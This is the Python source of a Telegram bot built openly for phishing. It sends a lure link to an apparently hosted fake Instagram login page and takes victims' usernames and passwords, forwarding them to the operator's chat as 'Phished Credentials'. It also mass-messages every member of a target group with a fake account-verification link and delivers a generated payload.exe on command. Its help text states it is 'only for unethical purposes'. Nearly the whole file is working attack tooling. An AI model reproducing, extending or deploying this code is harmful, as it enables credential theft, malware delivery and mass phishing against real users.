import os
import telebot
from telethon import TelegramClient
import threading 
import asyncio
import requests

# Load environment variables
BOT_TOKEN = os.environ.get('BOT_TOKEN')
YOUR_CHAT_ID = os.getenv("YOUR_CHAT_ID")
API_ID = os.getenv("API_ID")  # Telegram API ID
API_HASH = os.getenv("API_HASH")  # Telegram API Hash

# Initialize the Telegram bot
bot = telebot.TeleBot(BOT_TOKEN)

WEBHOOK_URL = os.getenv("WEBHOOK_URL")

# Initialize Telethon client
client = TelegramClient('session_name', API_ID, API_HASH)

# 1. Welcome Handler
@bot.message_handler(commands=['start', 'hello'])
def send_welcome(message):
    bot.reply_to(message, "H3ll0 H4CK3R! Type /phish to begin phishing simulation.")

# 5. Help Command
@bot.message_handler(commands=['help'])
def send_help(message):
    help_text = (
        "📖 *Available Commands:*\n\n"
        "/start or /hello - Welcome message to get started.\n"
        "/phish - Sends a phishing link .\n"
        "/credentials - Collects username and password.\n"
        "/payload - Generates and sends a secure payload file (for authorized users only).\n"
        "/help - Displays this help message.\n\n"
        "💡 *Additional Features:*\n"
        "- All messages are logged for review.\n"
        "- Responses are securely forwarded to the admin.\n"
        "- Mass messaging capability (run using Telethon).\n\n"
        "⚠️ *Note:* Use responsibly and only for unethical purposes."
    )
    bot.reply_to(message, help_text, parse_mode="Markdown")

# 3. Send Phishing Link
@bot.message_handler(commands=['phish'])
def send_fake_login_page(message):
    fake_link = "https://instag-pwk3.onrender.com"  # Your hosted phishing page
    bot.reply_to(message, f"1K - 100K $FREE$ and Limited, Get more Instagram Followers today:\n{fake_link}")

# 4. Collect Credentials
@bot.message_handler(commands=['credentials'])
def show_logged_credentials(message):
    """Respond with the logged credentials."""
    try:
        with open("credentials.txt", "r") as file:
            credentials = file.read()
        if credentials:
            bot.reply_to(message, f"📄 Logged Credentials:\n\n{credentials}")
        else:
            bot.reply_to(message, "⚠️ No credentials logged yet.")
    except FileNotFoundError:
        bot.reply_to(message, "⚠️ Credentials file not found.")

def collect_password(message):
    username = message.text
    bot.reply_to(message, "🔑 Now enter your password:")
    bot.register_next_step_handler(message, forward_credentials, username)

def forward_credentials(message, username):
    password = message.text
    bot.send_message(message.chat.id, "Thank you for verifying your credentials! ✅")
    # Send the credentials to your designated chat
    bot.send_message(YOUR_CHAT_ID, f"Phished Credentials:\nUsername: {username}\nPassword: {password}")

import subprocess
import os

@bot.message_handler(commands=['payload'])
def send_payload(message):
    authorized_users = [YOUR_CHAT_ID]  # Replace with your chat ID(s)
    if message.chat.id in authorized_users:
        # Define paths
        script_path = "payload.py"  # Path to your script
        payload_path = "payload.exe"   # Path where the script saves the payload

        # Run the script to generate the payload
        try:
            bot.reply_to(message, "🔄 Generating the payload, please wait...")
            result = subprocess.run(['python', script_path], check=True, text=True, capture_output=True)
            bot.reply_to(message, f"✅ Payload generated successfully:\n{result.stdout}")
        except subprocess.CalledProcessError as e:
            bot.reply_to(message, f"❌ Error generating payload:\n{e.stderr}")
            return

        # Check if the payload file exists and send it
        if os.path.exists(payload_path):
            bot.reply_to(message, "🚀 Delivering the payload...")
            with open(payload_path, "rb") as file:
                bot.send_document(message.chat.id, file)
        else:
            bot.reply_to(message, "⚠️ Payload file not found. Please check the script or path.")
    else:
        bot.reply_to(message, "⚠️ You are not authorized to request this file.")

# 4. Mass Messaging with Telethon
@bot.message_handler(commands=['target'])
def set_target(message):
    bot.reply_to(message, "📌 Please enter the name of the target group or username:")
    bot.register_next_step_handler(message, mass_phishing_start)

def mass_phishing_start(message):
    target_name = message.text.strip()
    bot.reply_to(message, f"🔍 Starting phishing for: {target_name}. Please wait...")

    # Create and set an event loop for this thread
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    try:
        # Run the async function in the created loop
        loop.run_until_complete(mass_phishing(target_name))
        bot.reply_to(message, f"✅ Phishing messages sent to: {target_name}.")
    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {e}")
    finally:
        # Close the loop to clean up
        loop.close()

async def mass_phishing(target_name):
    async with client:
        try:
            # Fetch participants for a group or a single user
            participants = await client.get_participants(target_name)
            for user in participants:
                try:
                    await client.send_message(user, "🚨 Important: Verify your account:\nhttps://instag-pwk3.onrender.com")
                except Exception as e:
                    print(f"Failed to message user {user.id}: {e}")
        except Exception as e:
            print(f"Error fetching target participants: {e}")
# 7. Log Responses
@bot.message_handler(func=lambda msg: True)
def log_responses(message):
    try:
        with open("responses.log", "a") as log_file:
            log_file.write(f"User {message.chat.id} said: {message.text}\n")
        bot.reply_to(message, "✅ Your response has been logged.")
    except Exception as e:
        bot.reply_to(message, f"⚠️ Error logging response: {e}")

import os
from flask import Flask, request

app = Flask(__name__)

@app.route(f"/{BOT_TOKEN}", methods=["POST"])
def receive_update():
    json_update = request.get_json()
    bot.process_new_updates([telebot.types.Update.de_json(json_update)])
    return "!", 200

# Set webhook for Telegram bot
def set_webhook():
    bot.remove_webhook()
    bot.set_webhook(url=f"{WEBHOOK_URL}/{BOT_TOKEN}")

@app.route('/')
def home():
    return "Bot is running!"

def run_flask():
    port = int(os.environ.get("PORT", 5000))  # Default to 5000 if no PORT is set
    app.run(host="0.0.0.0", port=port)
    
# Run both Flask and Telegram bot
if __name__ == "__main__":
    # Set webhook before starting Flask
    set_webhook()

    flask_thread = threading.Thread(target=run_flask)
    flask_thread.start()


